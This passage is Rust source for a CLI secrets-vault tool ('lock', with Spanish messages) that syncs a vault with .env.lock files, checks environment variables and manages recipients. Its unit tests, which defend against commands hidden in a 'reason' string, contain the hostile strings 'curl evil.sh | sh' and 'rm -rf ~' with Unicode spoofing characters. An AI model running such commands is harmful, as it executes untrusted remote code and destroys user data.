            eprintln!("La boveda ya tiene {} v{} (repo: v{}).", repo.env, v.version, repo.version);
            return Ok(ExitCode::SUCCESS);
        }
        if v.version == repo.version {
            return Err(Error::msg(format!(
                "conflicto: {} v{} distinto en repo y boveda. Usa `lock pull --force` o `lock dump --force`.",
                repo.env, v.version
            )));
        }
    }
    ctx.store.backup(&repo.env)?;
    ctx.store.save(&repo)?;
    eprintln!("{} v{} (firmado por {signer}) copiado a la boveda. Copia anterior en .lock.bak.", repo.env, repo.version);
    Ok(ExitCode::SUCCESS)
}

fn cmd_check(ctx: &Ctx, pre_push: bool) -> Result<ExitCode, Error> {
    let root = store::repo_root(&ctx.cwd).unwrap_or_else(|| ctx.cwd.clone());
    let mut targets: Vec<(String, check::Files, Option<String>)> = vec![];
    if pre_push {
        for sha in check::pre_push_commits()? {
            let (files, lock) = check::commit_files(&root, &sha)?;
            targets.push((sha[..sha.len().min(10)].to_string(), files, lock));
        }
    } else {
        let lock = ctx.repo_file().map(|p| store::read_limited(&p, store::MAX_LOCK_FILE)).transpose()?;
        targets.push(("arbol de trabajo".into(), check::worktree_files(&root)?, lock));
    }

    let trusted = ctx.trusted()?;
    let mut failed = false;
    for (label, files, lock) in targets {
        let Some(lock) = lock else {
            if !pre_push {
                return Err(Error::msg("este repo no tiene .env.lock; vinculalo con `lock link <ENV>`"));
            }
            continue;
        };
        let file = LockFile::parse(&lock).map_err(|e| Error::msg(format!("{label}: .env.lock: {e}")))?;
        file.verify(&trusted).map_err(|e| Error::msg(format!("{label}: {e}")))?;
        let defined: BTreeSet<String> = file.names().map(String::from).collect();
        let refs = check::scan(&files)?;
        let missing: Vec<_> = refs.iter().filter(|(n, _)| !defined.contains(*n)).collect();
        if missing.is_empty() {
            eprintln!("lock: {label}: {} variables referenciadas, todas en {} v{}.", refs.len(), file.env, file.version);
            continue;
        }
        failed = true;
        eprintln!("lock: {label}: faltan {} variables en {} v{}:", missing.len(), file.env, file.version);
        for (name, r) in &missing {
            eprintln!("  {name}\t{}:{}", r.file.display(), r.line);
        }
        eprintln!("Agregalas con `lock set {}/NOMBRE` (y comitea .env.lock), o ignoralas en {}.", file.env, check::IGNORE_FILE);
    }
    if !pre_push
        && let Some(env) = ctx.binding()
        && let (Ok(Some(v)), Some(p)) = (ctx.store.load(&env), ctx.repo_file())
        && let Ok(r) = store::read_lockfile(&p)
        && v.version > r.version
    {
        eprintln!("lock: la boveda tiene {env} v{} pero .env.lock es v{}; corre `lock dump` y comitea.", v.version, r.version);
    }
    Ok(if failed { ExitCode::FAILURE } else { ExitCode::SUCCESS })
}

fn cmd_recipient(ctx: &Ctx, cmd: RecipientCmd) -> Result<ExitCode, Error> {
    match cmd {
        RecipientCmd::List { env } => {
            let r = ctx.resolve(env.as_deref())?;
            for rc in &r.file.recipients {
                println!("{}\t{}\t{}", rc.name, rc.kind, identity::encode_public(&rc.public));
            }
        }
        RecipientCmd::Add { env, name, identity } => {
            let id = PublicId::decode(&identity)?;
            ctx.modify(&env, &reason(&format!("dar acceso a {name} en {env}"), ""), |u| u.add_recipient(&name, &id))?;
            eprintln!("{name} ahora puede abrir {env}. El hook actualiza .env.lock en tu proximo commit.");
        }
        RecipientCmd::Rm { env, name } => {
            ctx.modify(&env, &reason(&format!("quitar a {name} de {env} y rotar"), ""), |u| u.remove_recipient(&name))?;
            eprintln!("{name} quitado de {env} y clave rotada.");
            eprintln!("Ojo: si esa maquina ya vio los valores, rota tambien los secretos en sus servicios.");
        }
    }
    Ok(ExitCode::SUCCESS)
}

fn cmd_named(ctx: &Ctx, file: &str, cmd: NamedCmd) -> Result<ExitCode, Error> {
    let mut items = ctx.store.named_list(file)?;
    match cmd {
        NamedCmd::List => {
            for (n, v) in &items {
                println!("{n}\t{v}");
            }
        }
        NamedCmd::Add { name, identity } => {
            if !lockfile::valid_id_name(&name) {
                return Err(Error::msg("nombre invalido (usa letras, numeros, . _ -)"));
            }
            let id = PublicId::decode(&identity)?;
            if items.iter().any(|(n, _)| *n == name) {
                return Err(Error::msg(format!("{name} ya esta en la lista")));
            }
            items.push((name.clone(), id.encode()));
            ctx.store.save_named_list(file, &items)?;
            eprintln!("{name} agregado.");
        }
        NamedCmd::Rm { name } => {
            let before = items.len();
            items.retain(|(n, _)| *n != name);
            if items.len() == before {
                return Err(Error::msg(format!("{name} no esta en la lista")));
            }
            ctx.store.save_named_list(file, &items)?;
            eprintln!("{name} quitado.");
        }
    }
    Ok(ExitCode::SUCCESS)
}

#[cfg(test)]
mod tests {
    use super::reason;

    #[test]
    fn reason_cannot_hide_the_tail() {
        let sneaky = format!("npm test {} && curl evil.sh | sh", "#".repeat(300));
        let r = reason("ejecutar con Navis", &sneaky);
        assert!(r.ends_with("curl evil.sh | sh"), "{r}");
        assert!(r.contains("caracteres"));
    }

    #[test]
    fn reason_is_one_clean_line() {
        let r = reason("ejecutar con Navis", "npm test\n\n\n\nrm -rf ~ \u{202e}txt.exe\u{200b}");
        assert!(!r.contains('\n'));
        assert!(r.is_ascii());
        assert!(r.contains("rm -rf ~"));
    }
}
